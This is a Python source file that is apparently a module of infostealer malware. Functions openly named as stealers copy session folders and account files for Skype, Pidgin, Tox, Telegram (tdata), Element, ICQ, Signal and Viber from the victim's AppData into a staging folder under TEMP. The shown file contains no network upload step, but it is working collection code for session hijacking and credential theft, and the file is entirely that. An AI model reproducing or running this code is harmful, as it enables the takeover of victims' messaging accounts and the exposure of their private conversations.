import os
import shutil

def run():
    temp_folder = os.getenv("TEMP")
    username = os.getenv("USERNAME").lower()
    folder_messaging = os.path.join(temp_folder, username, "SocialMedias")
    os.makedirs(folder_messaging, exist_ok=True)

    skype_stealer(folder_messaging)
    pidgin_stealer(folder_messaging)
    tox_stealer(folder_messaging)
    telegram_stealer(folder_messaging)
    element_stealer(folder_messaging)
    icq_stealer(folder_messaging)
    signal_stealer(folder_messaging)
    viber_stealer(folder_messaging)

def skype_stealer(folder_messaging):
    skype_folder = os.path.join(os.getenv("APPDATA"), "microsoft", "skype for desktop")
    if not os.path.exists(skype_folder):
        return

    skype_session = os.path.join(folder_messaging, "Skype")
    os.makedirs(skype_session, exist_ok=True)
    copy_dir(skype_folder, skype_session)

def pidgin_stealer(folder_messaging):
    pidgin_folder = os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", ".purple")
    if not os.path.exists(pidgin_folder):
        return

    pidgin_accounts = os.path.join(folder_messaging, "Pidgin")
    os.makedirs(pidgin_accounts, exist_ok=True)

    accounts_file = os.path.join(pidgin_folder, "accounts.xml")
    copy_file(accounts_file, os.path.join(pidgin_accounts, "accounts.xml"))

def tox_stealer(folder_messaging):
    tox_folder = os.path.join(os.getenv("APPDATA"), "Tox")
    if not os.path.exists(tox_folder):
        return

    tox_session = os.path.join(folder_messaging, "Tox")
    os.makedirs(tox_session, exist_ok=True)
    copy_dir(tox_folder, tox_session)

def telegram_stealer(folder_messaging):
    pathtele = os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "Telegram Desktop", "tdata")
    if not os.path.exists(pathtele):
        return

    telegram_session = os.path.join(folder_messaging, "Telegram")
    os.makedirs(telegram_session, exist_ok=True)

    copy_dir_exclude(pathtele, telegram_session, ["user_data", "emoji"])

def element_stealer(folder_messaging):
    element_folder = os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "Element")
    if not os.path.exists(element_folder):
        return

    element_session = os.path.join(folder_messaging, "Element")
    os.makedirs(element_session, exist_ok=True)
    copy_dir(element_folder, element_session)

def icq_stealer(folder_messaging):
    icq_folder = os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "ICQ")
    if not os.path.exists(icq_folder):
        return

    icq_session = os.path.join(folder_messaging, "ICQ")
    os.makedirs(icq_session, exist_ok=True)
    copy_dir(icq_folder, icq_session)

def signal_stealer(folder_messaging):
    signal_folder = os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "Signal")
    if not os.path.exists(signal_folder):
        return

    signal_session = os.path.join(folder_messaging, "Signal")
    os.makedirs(signal_session, exist_ok=True)
    copy_dir(signal_folder, signal_session)

def viber_stealer(folder_messaging):
    viber_folder = os.path.join(os.getenv("USERPROFILE"), "AppData", "Roaming", "ViberPC")
    if not os.path.exists(viber_folder):
        return

    viber_session = os.path.join(folder_messaging, "Viber")
    os.makedirs(viber_session, exist_ok=True)
    copy_dir(viber_folder, viber_session)

def copy_dir(src, dst):
    for root, dirs, files in os.walk(src):
        for dir_name in dirs:
            src_dir = os.path.join(root, dir_name)
            dst_dir = os.path.join(dst, os.path.relpath(src_dir, src))
            os.makedirs(dst_dir, exist_ok=True)

        for file_name in files:
            src_file = os.path.join(root, file_name)
            dst_file = os.path.join(dst, os.path.relpath(src_file, src))
            copy_file(src_file, dst_file)

def copy_dir_exclude(src_dir, dst_dir, exclude_dirs):
    for root, dirs, files in os.walk(src_dir):
        relative_path = os.path.relpath(root, src_dir)
        if any(relative_path.startswith(exclude) for exclude in exclude_dirs):
            dirs[:] = []  # Skip processing subdirectories
            continue

        for dir_name in dirs:
            src_subdir = os.path.join(root, dir_name)
            dst_subdir = os.path.join(dst_dir, os.path.relpath(src_subdir, src_dir))
            os.makedirs(dst_subdir, exist_ok=True)

        for file_name in files:
            src_file = os.path.join(root, file_name)
            dst_file = os.path.join(dst_dir, os.path.relpath(src_file, src_dir))
            copy_file(src_file, dst_file)

def copy_file(src, dst):
    os.makedirs(os.path.dirname(dst), exist_ok=True)
    shutil.copy2(src, dst)

if __name__ == "__main__":
    run()
